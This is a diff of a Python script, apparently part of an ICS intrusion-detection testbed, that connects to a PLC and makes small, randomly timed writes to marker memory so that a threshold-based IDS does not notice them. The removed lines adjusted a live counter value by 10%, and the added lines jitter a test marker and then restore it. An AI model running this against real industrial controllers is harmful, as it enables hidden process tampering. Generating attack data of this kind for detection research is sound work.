@@ -1,8 +1,7 @@
 """
-STEALTHY_LOW_RATE_WRITE
-Ghi nhe trong nguong hop le, sai thoi diem quy trinh.
-Khong burst, khong flood — chi AI/context-aware moi detect.
-Thay thay ews_firmware_tamper.py
+STEALTHY_LOW_RATE_MARKER_WRITE
+Ghi nhe tan suat thap vao vung Marker thu nghiem.
+Gia tri trong nguong hop le -> threshold IDS bo qua.
 
 Goi tu bash:
   python -m attacks_ext.stealthy_write \
@@ -14,6 +13,18 @@ Goi tu bash:
 import time
 import random
 from attacks_ext.config_ext import base_parser, write_label
+
+TEST_MARKER = 100
+NORMAL_MIN = 900
+NORMAL_MAX = 1100
+
+
+def clamp(value):
+    if value < NORMAL_MIN:
+        return NORMAL_MIN + abs(value) % (NORMAL_MAX - NORMAL_MIN)
+    if value > NORMAL_MAX:
+        return NORMAL_MAX - abs(value) % (NORMAL_MAX - NORMAL_MIN)
+    return value
 
 
 def run(args):
@@ -35,28 +46,31 @@ def run(args):
 
     try:
         client.connect(args.target, args.rack, args.slot)
-        print(f"[+] Connected. Stealthy low-rate write...")
+        print(f"[+] Connected. Low-rate write to MD{TEST_MARKER}...")
+
+        current = get_dint(client.read_area(Areas.MK, 0, TEST_MARKER, 4), 0)
+        baseline = current if NORMAL_MIN <= current <= NORMAL_MAX else 1000
+        if current != baseline:
+            buf = bytearray(4)
+            set_dint(buf, 0, baseline)
+            client.write_area(Areas.MK, 0, TEST_MARKER, buf)
+            print(f"[*] MD{TEST_MARKER} {current} -> {baseline} (set to normal)")
 
         end_time = time.time() + args.duration
         while time.time() < end_time:
-            try:
-                cd1 = get_dint(client.read_area(Areas.MK, 0, 54, 4), 0)
-            except Exception:
-                cd1 = 0
+            current = get_dint(client.read_area(Areas.MK, 0, TEST_MARKER, 4), 0)
+            new_val = clamp(current + random.choice([-12, -8, 8, 12]))
+            buf = bytearray(4)
+            set_dint(buf, 0, new_val)
+            client.write_area(Areas.MK, 0, TEST_MARKER, buf)
+            write_count += 1
+            print(f"  [{write_count}] MD{TEST_MARKER} {current} -> {new_val}")
+            time.sleep(random.uniform(8, 15))
 
-            if cd1 > 0 and cd1 < 30000:
-                new_val = int(cd1 * 1.10)
-                if new_val > 30000:
-                    new_val = int(cd1 * 0.90)
-                buf = bytearray(4)
-                set_dint(buf, 0, new_val)
-                client.write_area(Areas.MK, 0, 54, buf)
-                write_count += 1
-                print(f"  [{write_count}] CD1 {cd1} -> {new_val}")
-            elif write_count % 3 == 0:
-                print(f"  [wait] CD1 idle, no stealthy window")
-
-            time.sleep(random.uniform(15, 30))
+        buf = bytearray(4)
+        set_dint(buf, 0, baseline)
+        client.write_area(Areas.MK, 0, TEST_MARKER, buf)
+        print(f"[*] Restored MD{TEST_MARKER} = {baseline}")
 
     except Exception as e:
         print(f"[ERR] {e}")
@@ -66,11 +80,11 @@ def run(args):
         write_label(args.label_file, label_prefix, "END",
                     args.session_id, args.host_id,
                     episode_id=args.episode_id, day=args.day,
-                    note=f"writes={write_count}")
+                    note=f"writes={write_count} target=MD{TEST_MARKER}")
 
 
 def main():
-    p = base_parser("Stealthy Low-Rate Write (Context-Aware)")
+    p = base_parser("Stealthy Low-Rate Marker Write")
     p.add_argument("--target", default="192.168.210.211")
     p.add_argument("--rack", type=int, default=0)
     p.add_argument("--slot", type=int, default=1)
